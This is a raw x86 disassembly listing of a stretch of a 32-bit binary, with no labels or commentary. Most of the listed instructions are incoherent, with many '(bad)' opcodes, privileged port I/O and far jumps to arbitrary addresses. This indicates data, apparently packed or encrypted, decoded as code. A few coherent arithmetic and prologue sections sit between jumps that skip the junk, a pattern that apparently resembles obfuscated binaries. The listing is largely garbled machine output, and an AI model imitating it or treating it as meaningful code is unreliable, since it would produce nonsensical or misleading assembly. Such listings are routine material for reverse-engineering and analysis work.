  413a47:	or     dh,BYTE PTR [eax+edi*4-0x47]
  413a4b:	inc    ebp
  413a4c:	lahf   
  413a4d:	lods   eax,DWORD PTR ds:[esi]
  413a4e:	mov    edx,0xb51653be
  413a53:	xlat   BYTE PTR ds:[ebx]
  413a54:	test   eax,0x582c1d45
  413a59:	mov    ch,0x8a
  413a5b:	imul   ebp,DWORD PTR [edi],0x8
  413a5e:	nop
  413a5f:	sub    al,0x97
  413a61:	ins    BYTE PTR es:[edi],dx
  413a62:	enter  0x6d87,0xd3
  413a66:	(bad)  
  413a67:	jbe    0x413a7d
  413a69:	dec    ecx
  413a6a:	jmp    FWORD PTR [ecx-0x23]
  413a6d:	cwde   
  413a6e:	push   esp
  413a6f:	inc    esp
  413a70:	adc    BYTE PTR [esp+ebp*1],cl
  413a73:	ret    0xfbb
  413a76:	add    al,0x74
  413a78:	pop    ss
  413a79:	arpl   WORD PTR [ebx+0x552b6af2],bp
  413a7f:	lea    ebx,[edi+0x72407934]
  413a85:	push   cs
  413a86:	pop    edi
  413a87:	mov    ecx,0xb670074f
  413a8c:	lods   al,BYTE PTR ds:[esi]
  413a8d:	gs sar cl,0x6e
  413a91:	push   eax
  413a92:	aas    
  413a93:	push   ss
  413a94:	inc    esp
  413a95:	mov    bh,0xd7
  413a97:	addr16 pop ss
  413a99:	push   esi
  413a9a:	shl    DWORD PTR [eax+0x5703685b],0xc9
  413aa1:	jl     0x413a6b
  413aa3:	scas   eax,DWORD PTR es:[edi]
  413aa4:	lods   al,BYTE PTR ds:[esi]
  413aa5:	std    
  413aa6:	cmp    eax,0x1c20bd47
  413aab:	outs   dx,BYTE PTR ds:[esi]
  413aac:	jp     0x413af2
  413aae:	push   cs
  413aaf:	sub    edi,ebp
  413ab1:	scas   al,BYTE PTR es:[edi]
  413ab2:	fdivr  QWORD PTR [ebx]
  413ab4:	les    edi,FWORD PTR [ecx-0x5d]
  413ab7:	jecxz  0x413b37
  413ab9:	dec    eax
  413aba:	pop    ebp
  413abb:	sahf   
  413abc:	inc    esi
  413abd:	and    ah,ch
  413abf:	out    0xa0,eax
  413ac1:	push   esi
  413ac2:	cmc    
  413ac3:	das    
  413ac4:	inc    edi
  413ac5:	fstp   QWORD PTR [edx-0x9]
  413ac8:	sbb    DWORD PTR [edi+ecx*2-0x3c3b9c71],0x444898a3
  413ad3:	imul   ebp,ebp,0xfab93105
  413ad9:	mov    cl,0xe0
  413adb:	or     ebp,DWORD PTR [esp+ebx*8]
  413ade:	ffree  st(5)
  413ae0:	push   esp
  413ae1:	or     eax,0x2cd0c7a8
  413ae6:	adc    eax,0xb5ebaa71
  413aeb:	mov    dh,0xc1
  413aed:	jns    0x413a86
  413aef:	jb     0x4c995c01
  413af5:	dec    eax
  413af6:	(bad)  
  413af7:	sbb    BYTE PTR [edx-0x80],dl
  413afa:	(bad)  
  413afb:	xchg   ecx,eax
  413afc:	stc    
  413afd:	lds    eax,FWORD PTR [ecx-0x77]
  413b00:	in     al,0xa7
  413b02:	mov    ebx,DWORD PTR [edx+0x43]
  413b05:	push   es
  413b06:	jmp    0x5cdd7615
  413b0b:	jmp    0xa53670cc
  413b10:	cmp    BYTE PTR [esi],cl
  413b12:	pop    ecx
  413b13:	add    al,0x69
  413b15:	push   edi
  413b16:	push   ds
  413b17:	push   edi
  413b18:	mov    eax,ds:0x9f2fefb
  413b1d:	sub    DWORD PTR [ecx+0x6fda93a3],edx
  413b23:	push   eax
  413b24:	in     al,dx
  413b25:	mov    eax,0xd3713b40
  413b2a:	(bad)  
  413b2b:	outs   dx,DWORD PTR ds:[esi]
  413b2c:	fild   DWORD PTR [ebp+0x26b1dfb3]
  413b32:	add    eax,0x532b9cb5
  413b37:	add    dl,cl
  413b39:	neg    DWORD PTR [ebp-0x44]
  413b3c:	inc    eax
  413b3d:	xor    al,0x24
  413b3f:	push   edx
  413b40:	fbstp  TBYTE PTR [edi-0x79bb6a5e]
  413b46:	ins    DWORD PTR es:[edi],dx
  413b47:	push   0xffffff93
  413b49:	sub    BYTE PTR [ecx],ah
  413b4b:	dec    ecx
  413b4c:	mov    ebp,0x5060ea62
  413b51:	stos   BYTE PTR es:[edi],al
  413b52:	(bad)  
  413b53:	and    esp,0x39f2c2d9
  413b59:	fsub   DWORD PTR [esi-0x61]
  413b5c:	pop    esi
  413b5d:	push   ebx
  413b5e:	sti    
  413b5f:	pop    ss
  413b60:	(bad)  
  413b61:	lods   al,BYTE PTR ds:[esi]
  413b62:	retf   0x38a6
  413b65:	mov    edx,0xecbabce7
  413b6a:	out    0x68,eax
  413b6c:	test   eax,0x8f84df60
  413b71:	call   0xfafc:0xd5e12399
  413b78:	ss aaa 
  413b7a:	xchg   esi,ecx
  413b7c:	and    eax,0x52e2a0b4
  413b81:	loope  0x413bc2
  413b83:	jmp    0xfcc0:0x8407cbdf
  413b8a:	scas   al,BYTE PTR es:[edi]
  413b8b:	leave  
  413b8c:	mov    ds:0x22f21e0b,eax
  413b91:	mov    ds:0xa0f96ce3,eax
  413b96:	fisttp QWORD PTR [edi+0x56c3dacd]
  413b9c:	out    0xbf,al
  413b9e:	cld    
  413b9f:	stos   DWORD PTR es:[edi],eax
  413ba0:	mov    dl,0x69
  413ba2:	retf   
  413ba3:	stos   BYTE PTR es:[edi],al
  413ba4:	push   ecx
  413ba5:	shl    edx,0x7d
  413ba8:	fild   DWORD PTR [ebp+0x3a]
  413bab:	fs xchg esp,eax
  413bad:	mov    bl,0x50
  413baf:	sbb    dh,BYTE PTR ds:0x663e0b6c
  413bb5:	adc    eax,0x641142dc
  413bba:	aam    0x8c
  413bbc:	dec    esp
  413bbd:	push   0x1634b502
  413bc2:	fstp   TBYTE PTR [ebx+0x4c7f890c]
  413bc8:	jnp    0x413ba2
  413bca:	(bad)  
  413bcb:	adc    DWORD PTR [ebx-0x211752c3],eax
  413bd1:	push   ecx
  413bd2:	(bad)  
  413bd4:	mov    al,0xb3
  413bd6:	lods   eax,DWORD PTR ds:[esi]
  413bd7:	cmp    dh,BYTE PTR [esi]
  413bd9:	lds    esi,FWORD PTR [ecx]
  413bdb:	out    0x6f,eax
  413bdd:	shr    BYTE PTR [ecx],cl
  413bdf:	or     cl,bh
  413be1:	es adc al,0xbf
  413be4:	mov    dl,0xec
  413be6:	aam    0xdc
  413be8:	daa    
  413be9:	stc    
  413bea:	test   BYTE PTR [edx+0x180a8587],0x63
  413bf1:	sbb    eax,0x9ac82db1
  413bf6:	fs dec edi
  413bf8:	mov    al,ds:0x96e232e1
  413bfd:	lods   eax,DWORD PTR ds:[esi]
  413bfe:	adc    BYTE PTR [edx+0x4e],bl
  413c01:	nop
  413c02:	scas   al,BYTE PTR es:[edi]
  413c03:	jmp    0xa09c:0x7927a4cf
  413c0a:	lds    eax,FWORD PTR [edx]
  413c0c:	les    ebp,FWORD PTR [ebx-0x7aef9663]
  413c12:	sbb    eax,0xacc392b9
  413c17:	sar    BYTE PTR [edi],0x91
  413c1a:	dec    ecx
  413c1b:	iret   
  413c1c:	mov    al,ds:0x58b6fa5f
  413c21:	test   al,0x6b
  413c23:	sbb    eax,0xabc64826
  413c28:	fcomp  QWORD PTR [edx]
  413c2a:	sub    DWORD PTR [ecx],0xf31ba3b9
  413c30:	pop    ebx
  413c31:	xchg   esi,eax
  413c32:	mov    ah,al
  413c34:	(bad)  
  413c35:	ins    BYTE PTR es:[edi],dx
  413c36:	inc    eax
  413c37:	mov    dl,0xec
  413c39:	xchg   ecx,eax
  413c3a:	imul   ecx,DWORD PTR [ebp+0x263cea61],0x90cbe038
  413c44:	cmp    edi,DWORD PTR [edx-0x20]
  413c47:	push   0x40aaca82
  413c4c:	or     dh,dh
  413c4e:	xchg   DWORD PTR [eax-0x5a],esi
  413c51:	lods   eax,DWORD PTR ds:[esi]
  413c52:	mov    ebp,DWORD PTR [esi-0x3382fa77]
  413c58:	push   esp
  413c59:	jl     0x413cbf
  413c5b:	outs   dx,BYTE PTR ds:[esi]
  413c5c:	mov    ds:0xef9b6abf,al
  413c61:	mov    cl,0xb2
  413c63:	sti    
  413c64:	ja     0x413c0d
  413c66:	mov    ebp,0xa93aca02
  413c6b:	xor    BYTE PTR [ecx+0x11f2c6cd],ch
  413c71:	sbb    ecx,esp
  413c73:	loopne 0x413caa
  413c75:	xchg   esp,eax
  413c76:	xchg   esi,eax
  413c77:	(bad)  
  413c78:	std    
  413c79:	rol    ebx,cl
  413c7b:	lea    edi,[eax+0xce59518]
  413c81:	sbb    DWORD PTR [eax-0x64],edi
  413c84:	and    DWORD PTR [edi+0x65],ecx
  413c87:	push   ebp
  413c88:	dec    edi
  413c89:	mov    cl,0xe8
  413c8b:	push   ecx
  413c8c:	lods   eax,DWORD PTR ds:[esi]
  413c8d:	lds    esp,FWORD PTR [esi-0x6e78cbdc]
  413c93:	cmp    eax,0xe7ad1e95
  413c98:	in     eax,dx
  413c99:	scas   eax,DWORD PTR es:[di]
  413c9b:	mov    ds:0x4463e18e,al
  413ca0:	inc    esi
  413ca1:	stos   DWORD PTR es:[edi],eax
  413ca2:	fisubr DWORD PTR [ebx]
  413ca4:	and    eax,0xc1b1000e
  413ca9:	call   0xd84d:0x8b100375
  413cb0:	adc    ebx,DWORD PTR [eax+0x4]
  413cb3:	push   0x2
  413cb5:	xor    ebx,esi
  413cb7:	mov    esi,DWORD PTR [ebp-0x24]
  413cba:	pop    esi
  413cbb:	sub    esi,ecx
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	test   BYTE PTR [edx],ah
  413d00:	clc    
  413d01:	push   0xffffff89
  413d03:	xor    bl,BYTE PTR [eax]
  413d05:	sbb    BYTE PTR [edx+0xf181812],ch
  413d0b:	aaa    
  413d0c:	(bad)
  413d10:	jae    0x413cb2
  413d12:	clc    
  413d13:	shr    BYTE PTR ds:0x2b872527,0x99
  413d1a:	dec    eax
  413d1b:	mov    al,ds:0x281c7cfa
  413d20:	inc    ecx
  413d21:	sub    dh,bl
  413d23:	xor    dl,dh
  413d25:	adc    al,0xbf
  413d27:	adc    eax,0x60dab38b
  413d2c:	sti    
  413d2d:	int3   
  413d2e:	lods   eax,DWORD PTR ds:[esi]
  413d2f:	dec    edi
  413d30:	add    DWORD PTR [edx],esi
  413d32:	sbb    DWORD PTR [edx],eax
  413d34:	iret   
  413d35:	sbb    BYTE PTR [edi-0x7c],ch
  413d38:	mov    bl,0xef
  413d3a:	sub    ecx,DWORD PTR [esi-0x70]
  413d3d:	push   esp
  413d3e:	lds    edx,FWORD PTR [edi+0x3649442c]
  413d44:	jmp    0xac87:0xeabbbe3d
  413d4b:	sti    
  413d4c:	cli    
  413d4d:	or     eax,0xc8c89b1e
  413d52:	jns    0x413d6d
  413d54:	adc    al,0xd0
  413d56:	and    eax,0xae5eb0dd
  413d5b:	sub    dl,BYTE PTR [eax+0x25]
  413d5e:	xlat   BYTE PTR ds:[ebx]
  413d5f:	int    0xa7
  413d61:	add    ecx,ebp
  413d63:	pop    ss
  413d64:	mov    ds:0x9d875f3,al
  413d69:	call   0x784c1211
  413d6e:	jbe    0x413d89
  413d70:	fld    TBYTE PTR [ebp-0x4741775c]
  413d76:	fwait
  413d77:	(bad)
  413d7b:	mov    cl,0x6a
  413d7d:	cli    
  413d7e:	dec    ebx
  413d7f:	lds    edi,FWORD PTR gs:[edx]
  413d82:	sbb    eax,DWORD PTR [edi+ebx*1]
  413d85:	ins    BYTE PTR es:[edi],dx
  413d86:	sbb    ecx,ecx
  413d88:	sub    BYTE PTR ds:0xf2f850ee,ch
  413d8e:	and    ch,BYTE PTR fs:0x9930c1f5
  413d95:	mov    esp,0x42efe6a3
  413d9a:	arpl   WORD PTR [ebp-0x46],si
  413d9d:	push   ecx
  413d9e:	pop    esi
  413d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413da0:	lods   al,BYTE PTR ds:[esi]
  413da1:	jg     0x413d30
  413da3:	lods   eax,DWORD PTR ds:[esi]
  413da4:	cmp    eax,0x95990b57
  413da9:	sbb    dh,BYTE PTR [ebp+0x47]
  413dac:	aaa    
  413dad:	xor    BYTE PTR [edx-0x60],dl
  413db0:	loopne 0x413dd8
  413db2:	psadbw mm0,QWORD PTR [esi]
  413db5:	push   ds
  413db6:	bound  ebp,QWORD PTR [edx+0x55]
  413db9:	mov    ecx,DWORD PTR [eax]
  413dbb:	jp     0x413e36
  413dbd:	fdiv   DWORD PTR [edx+0x7e0c6d54]
  413dc3:	int    0xa0
  413dc5:	add    edx,edi
  413dc7:	push   ebx
  413dc8:	jmp    0x413e32
  413dca:	daa    
  413dcb:	test   al,0x9e
  413dcd:	mov    ah,0x26
  413dcf:	dec    esi
  413dd0:	dec    ecx
  413dd1:	(bad)  
  413dd2:	ja     0x413e4e
  413dd4:	ins    DWORD PTR es:[edi],dx
  413dd5:	aam    0xed
  413dd7:	stos   BYTE PTR es:[edi],al
  413dd8:	push   0x2d
  413dda:	or     BYTE PTR [eax-0x18],ah
  413ddd:	pop    edx
  413dde:	scas   al,BYTE PTR es:[edi]
  413ddf:	sahf   
  413de0:	pusha  
  413de1:	outs   dx,BYTE PTR ds:[esi]
  413de2:	rcr    esp,1
  413de4:	jnp    0x413dab
  413de6:	lahf   
  413de7:	fcomp  DWORD PTR [edi-0x34c97330]
  413ded:	push   esp
  413dee:	repz adc edx,DWORD PTR ds:0xb0ddd153
  413df5:	sub    al,0xc1
  413df7:	push   edi
  413df8:	pusha  
  413df9:	outs   dx,DWORD PTR ds:[esi]
  413dfa:	cmp    ebx,eax
  413dfc:	fmul   st(4),st
  413dfe:	ins    DWORD PTR es:[edi],dx
  413dff:	out    0xd0,al
  413e01:	pop    ss
  413e02:	or     BYTE PTR [edx-0x15],ah
  413e05:	call   0x72b158e6
  413e0a:	hlt    
  413e0b:	mov    ebp,0xb42a18ee
  413e10:	ss or  ah,bh
  413e13:	arpl   WORD PTR [esi],bx
  413e15:	js     0x413e92
  413e17:	loope  0x413de3
  413e19:	xor    al,0xad
  413e1b:	mov    ecx,DWORD PTR [edi+edx*8-0x7b]
  413e1f:	mov    ch,dl
  413e21:	bound  ecx,QWORD PTR [edi-0x36d34595]
  413e27:	dec    edx
  413e28:	or     eax,0xfa3ea104
  413e2d:	and    al,0x98
  413e2f:	aam    0xda
  413e31:	push   ecx
  413e32:	cmp    bh,BYTE PTR [ebx+ebx*1-0x40726370]
  413e39:	cmp    DWORD PTR [ecx],ebp
  413e3b:	jnp    0x413e01
  413e3d:	cmp    bl,BYTE PTR [edx+edi*4-0x48]
  413e41:	push   0xfffffff2
  413e43:	xor    esi,esi
  413e45:	jg     0x413e92
  413e47:	or     DWORD PTR [edi],esp
  413e49:	ficom  DWORD PTR [eax-0x5903b820]
  413e4f:	push   ss
  413e50:	mov    dl,BYTE PTR [ecx-0x164942e]
  413e56:	dec    esi
  413e57:	es push esi
  413e59:	pusha  
  413e5a:	retf   0xbc5
  413e5d:	xchg   ebx,eax
  413e5e:	test   dh,cl
  413e60:	mov    eax,0x61bcc37d
  413e65:	cmc    
  413e66:	outs   dx,DWORD PTR ds:[esi]
  413e67:	jbe    0x413e39
  413e69:	loope  0x413e92
  413e6b:	(bad)  
  413e6d:	(bad)  
  413e6e:	mov    esi,0xe40dc319
  413e73:	and    ch,BYTE PTR [eax-0x6b4cc69]
  413e79:	xchg   ebp,eax
  413e7a:	imul   esi,esp
  413e7d:	mov    ebp,DWORD PTR [ebx+0x41]
  413e80:	inc    edx
  413e81:	popf   
  413e82:	lea    esi,[esi-0x3e2956d1]
  413e88:	jne    0x413e49
  413e8a:	dec    edi
  413e8b:	jae    0x413e82
  413e8d:	scas   eax,DWORD PTR es:[edi]
  413e8e:	cli    
  413e8f:	sub    edx,DWORD PTR [eax+0x1]
  413e92:	into   
  413e93:	xor    al,0x8c
  413e95:	mov    BYTE PTR [eax+0x4c],ch
  413e98:	test   al,0xa8
  413e9a:	push   esp
  413e9b:	lahf   
  413e9c:	scas   al,BYTE PTR es:[edi]
  413e9d:	pushf  
  413e9e:	out    dx,eax
  413e9f:	mov    dl,0xab
  413ea1:	dec    esi
  413ea2:	or     eax,0xf19a4c28
  413ea7:	ins    BYTE PTR es:[edi],dx
  413ea8:	jmp    esi
  413eaa:	cmc    
  413eab:	adc    ah,BYTE PTR [ebp-0x7ca94dc7]
  413eb1:	mov    eax,0xc2b99452
  413eb6:	mov    esi,0x43094256
  413ebb:	lods   eax,DWORD PTR ds:[esi]
  413ebc:	imul   edi,DWORD PTR [edi-0x454161ba],0xcb53ffa8
  413ec6:	dec    edx
  413ec7:	sbb    eax,0x46ce72f2
  413ecc:	out    0x38,al
  413ece:	fwait
  413ecf:	outs   dx,DWORD PTR ds:[esi]
  413ed0:	ds jns 0x413e6e
  413ed3:	iret   
  413ed4:	inc    edx
  413ed5:	inc    ebx
  413ed6:	jmp    0xf94c8ab8
  413edb:	pusha  
  413edc:	ret    
  413edd:	adc    DWORD PTR [esi+edx*8-0x31778d17],esp
  413ee4:	sub    edx,DWORD PTR [ecx+ebp*4-0x2c5fee59]
  413eeb:	adc    al,0x74
  413eed:	xchg   ebp,eax
  413eee:	lds    esp,FWORD PTR [ebx+0x5b]
  413ef1:	leave  
  413ef2:	push   edx
  413ef3:	daa    
  413ef4:	ret    
  413ef5:	sub    ecx,ebx
  413ef7:	mov    esp,0xe1de72c8
  413efc:	xor    DWORD PTR [esi-0x62],eax
  413eff:	or     dh,BYTE PTR [ebp-0x1c]
  413f02:	push   ss
  413f03:	leave  
  413f04:	fdiv   st,st(0)
  413f06:	jp     0x413f5e
  413f08:	push   edi
  413f09:	pop    ecx
  413f0a:	or     eax,0xcb8b8201
  413f0f:	xchg   ebx,eax
  413f10:	adc    eax,edx
  413f12:	xchg   ecx,eax
  413f13:	iret   
  413f14:	xor    al,0x7
  413f16:	outs   dx,DWORD PTR ds:[esi]
  413f17:	cmp    ecx,DWORD PTR [edi-0x32c04405]
  413f1d:	inc    edx
  413f1e:	inc    ebx
  413f1f:	aaa    
  413f20:	aas    
  413f21:	sti    
  413f22:	mov    al,0x9f
  413f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f25:	mov    eax,0x272a9392
  413f2a:	jmp    0x93dc273b
  413f2f:	fimul  DWORD PTR [edx]
  413f31:	ja     0x413eff
  413f33:	mov    bh,0x65
  413f35:	jbe    0x413f7a
  413f37:	xor    ebp,edx
  413f39:	add    bl,BYTE PTR [esi+ecx*1-0x7e]
  413f3d:	jmp    FWORD PTR [ebp-0x45]
  413f40:	sub    BYTE PTR [ebx+eax*8-0x5f4fd800],cl
  413f47:	mov    ds,WORD PTR [ebx+0x31]
  413f4a:	mov    eax,0xa2467e09
  413f4f:	dec    edx
  413f50:	mov    al,ds:0x42f56982
  413f55:	jne    0x413f68
  413f57:	ret    0xf06b
  413f5a:	adc    eax,0x495b367b
  413f5f:	xchg   edi,eax
  413f60:	in     al,0x7f
  413f62:	stos   DWORD PTR es:[edi],eax
  413f63:	pop    esi
  413f64:	das    
  413f65:	cmp    BYTE PTR [esi-0x31616d4e],bh
  413f6b:	mov    bl,0x5a
  413f6d:	rcl    ecx,0x90
  413f70:	push   0xab01ce70
  413f75:	bound  edi,QWORD PTR [eax+0x3e]
  413f78:	dec    eax
  413f79:	inc    esi
  413f7a:	mov    WORD PTR [ebx-0x5f],ss
  413f7d:	adc    BYTE PTR [eax+0x2fcd1f9f],dl
  413f83:	fstp   DWORD PTR [ebp+0x5c]
  413f86:	loope  0x413f30
  413f88:	leave  
  413f89:	or     eax,0x9313b85d
  413f8e:	js     0x413fee
  413f90:	jne    0x413f2a
  413f92:	mov    ebp,0x6c8d63c6
  413f97:	leave  
  413f98:	popa   
  413f99:	sub    ebp,ebx
  413f9b:	add    DWORD PTR ds:0x188fb824,ecx
  413fa1:	push   ebp
  413fa2:	push   ss
  413fa3:	cmp    DWORD PTR [ebp+0x6],ebx
  413fa6:	mov    ecx,0x5c438d99
  413fab:	inc    DWORD PTR [edx-0x30]
  413fae:	cmovae esi,DWORD PTR [edx]
  413fb1:	mov    ch,0xe
  413fb3:	sub    edx,DWORD PTR [ecx]
  413fb5:	and    al,0xd3
  413fb7:	test   DWORD PTR [ebp+0x4a],ebx
  413fba:	fcmovnb st,st(4)
  413fbc:	xlat   BYTE PTR ds:[ebx]
  413fbd:	mov    BYTE PTR [edx-0x6b],ch
  413fc0:	aaa    
  413fc1:	sub    al,0x33
  413fc3:	pop    ss
  413fc4:	shr    ch,0xad
  413fc7:	sub    DWORD PTR [edx-0x4c8d2ad5],0x761c3796
  413fd1:	sti    
  413fd2:	cwde   
  413fd3:	sbb    al,0x17
  413fd5:	js     0x413fda
  413fd7:	imul   edi,DWORD PTR [edx+eiz*2-0x347636cc],0xfd68e8e6
  413fe2:	es push ds
  413fe4:	jmp    0xb9ab2c59
  413fe9:	xor    al,0xa9
  413feb:	out    0xeb,al
  413fed:	aam    0x52
  413fef:	fisttp DWORD PTR [eax-0x2d]
  413ff2:	out    dx,eax
  413ff3:	dec    ebp
  413ff4:	dec    eax
  413ff5:	test   al,0xf5
  413ff7:	mov    esi,0x7440b626
  413ffc:	sbb    ecx,0xda22f351
  414002:	mov    bh,0x96
  414005:	mov    ds:0xdcada218,eax
  41400a:	aas    
  41400b:	inc    edx
  41400c:	mov    ebx,0x8a95a06e
  414011:	cmp    al,0x90
  414013:	push   esi
  414014:	es mov ch,0x71
  414017:	jbe    0x413fe4
  414019:	adc    BYTE PTR [edi-0x7e],al
  41401c:	inc    ecx
  41401d:	loop   0x414065
  41401f:	cmp    al,0xa0
  414021:	add    BYTE PTR [ecx+edi*4+0x2721c0ec],ch
  414028:	or     eax,0xd66161cc
  41402d:	xchg   edi,eax
  41402e:	jb     0x41406b
  414030:	pop    ebx
  414031:	mov    dh,0x40
  414033:	and    BYTE PTR [edi-0x49715717],dl
  414039:	dec    ebx
  41403a:	ret    
  41403b:	clc    
  41403c:	cwde   
  41403d:	sub    eax,0x9651d421
  414042:	aad    0xf4
  414044:	add    DWORD PTR cs:[eax+0x4],ebx
  414048:	dec    esp
  414049:	push   es
  41404a:	out    dx,eax
  41404b:	sbb    eax,0x2db27c98
  414050:	push   0x206e0623
  414055:	cmc    
  414056:	les    ebx,FWORD PTR [esi+0x54726a40]
  41405c:	js     0x414032
  41405e:	shl    DWORD PTR [edi+0x62],0x5e
  414062:	mov    ?,WORD PTR [eax-0x28]
  414065:	dec    edx
  414066:	adc    al,0xb
  414068:	pusha  
  414069:	dec    esp
  41406a:	or     eax,0x51d241ac
  41406f:	inc    edi
  414070:	push   esp
  414071:	jns    0x4140bb
  414073:	jp     0x414016
  414075:	dec    edx
  414076:	xlat   BYTE PTR ds:[ebx]
  414077:	or     eax,0x43f06d30
  41407c:	dec    ebp
  41407d:	push   ecx
  41407e:	shr    bh,cl
  414080:	push   ebp
  414081:	or     BYTE PTR [edx+eax*4],0x70
  414085:	(bad)  
  414086:	adc    DWORD PTR [edx+0x23],edx
  414089:	and    DWORD PTR [esp+edi*1+0x63],eax
  41408d:	xchg   bl,ch
  41408f:	sar    BYTE PTR [eax-0x29],1
  414092:	sub    al,0xc4
  414094:	stc    
  414095:	cli    
  414096:	pop    ebx
  414097:	scas   al,BYTE PTR es:[edi]
  414098:	jl     0x414110
  41409a:	scas   al,BYTE PTR es:[edi]
  41409b:	xchg   esp,eax
  41409c:	pop    ebp
  41409d:	mov    dl,0xeb
  41409f:	fwait
  4140a0:	or     esp,DWORD PTR [ebx-0x58339f39]
  4140a6:	pop    es
  4140a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140a8:	mov    al,ds:0x581bb1a0
  4140ad:	icebp  
  4140ae:	mov    cl,0x31
  4140b0:	aaa    
  4140b1:	push   ecx
  4140b2:	(bad)  
  4140b3:	call   DWORD PTR [ebp+0x73a1c541]
  4140b9:	test   al,0x2d
  4140bb:	inc    esi
  4140bc:	pop    ebx
  4140bd:	or     edx,DWORD PTR [eax]
  4140bf:	fadd   QWORD PTR [edi]
  4140c1:	adc    BYTE PTR [ecx-0x4e],cl
  4140c4:	xchg   edx,eax
  4140c5:	push   edi
  4140c6:	mov    DWORD PTR [ebp-0x3c],esi
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x422049
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [ecx+ecx*4+0x70]
  414159:	fistp  QWORD PTR [esi+0x1a]
  41415c:	sub    al,0x18
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    bh,bh
  414164:	jp     0x41419d
  414166:	stc    
  414167:	pushf  
  414168:	movhps xmm3,QWORD PTR ds:0x815006e8
  41416f:	jmp    0x4141ce
  414171:	jmp    0x4141d5
  414173:	mov    ebx,0x98b6d0f5
  414178:	les    edi,FWORD PTR [esi]
  41417a:	or     cl,BYTE PTR [ecx-0x7a33446]
  414180:	fwait
  414181:	xchg   edi,eax
  414182:	outs   dx,DWORD PTR ds:[esi]
  414183:	pop    ebx
  414184:	cmp    al,0x2
  414186:	or     DWORD PTR [edx-0x6],eax
  414189:	arpl   si,bx
  41418b:	stos   BYTE PTR es:[edi],al
  41418c:	mov    edi,0xee180e50
  414191:	(bad)  
  414192:	out    0xcb,eax
  414194:	test   eax,0xb1ecefbc
  414199:	pop    edi
  41419a:	push   ebx
  41419b:	xchg   esi,eax
  41419c:	arpl   WORD PTR ss:[ebx+0x2a24e183],si
  4141a3:	pusha  
  4141a4:	out    dx,eax
  4141a5:	test   BYTE PTR [ecx+0x589ca02f],dl
  4141ab:	sub    ecx,edi
  4141ad:	and    ah,BYTE PTR [ebx+0x2b7ac95a]
  4141b3:	std    
  4141b4:	(bad)  
  4141b5:	mul    DWORD PTR [ebx+0x6cde6725]
  4141bb:	jge    0x4141dd
  4141bd:	sub    BYTE PTR [eax+0x34],ch
  4141c0:	dec    esi
  4141c1:	jo     0x4141a8
  4141c3:	lea    edi,[eax-0x4b2f0804]
  4141c9:	dec    esi
  4141ca:	mov    esp,DWORD PTR ds:0x1b40a134
  4141d0:	in     al,dx
  4141d1:	jmp    0x3fd97d80
  4141d6:	sar    BYTE PTR [edx-0x46],cl
  4141d9:	in     eax,dx
  4141da:	push   es
  4141db:	jmp    edi
  4141dd:	data16 aad 0xde
  4141e0:	into   
  4141e1:	xchg   ecx,eax
  4141e2:	sbb    eax,0xaa96f3d9
  4141e7:	int    0xfe
  4141e9:	jle    0x4141ab
  4141eb:	or     edi,DWORD PTR [edi]
  4141ed:	daa    
  4141ee:	and    DWORD PTR [esp+edi*2+0xd],0x982cba05
  4141f6:	sub    BYTE PTR [ebp+0x5a694131],cl
  4141fc:	(bad)  
  4141fd:	out    dx,ax
  4141ff:	lods   al,BYTE PTR ds:[esi]
  414200:	popa   
  414201:	inc    ebx
  414202:	xchg   edx,eax
  414203:	sub    DWORD PTR [edi+0x1b],esi
  414206:	inc    eax
  414207:	ret    0x3469
  41420a:	mov    ecx,0xe3439b6c
  41420f:	mov    ebx,0x8cc82b00
  414214:	das    
  414215:	(bad)  
  414216:	mov    al,ds:0x1e39ed4b
  41421b:	shl    bl,cl
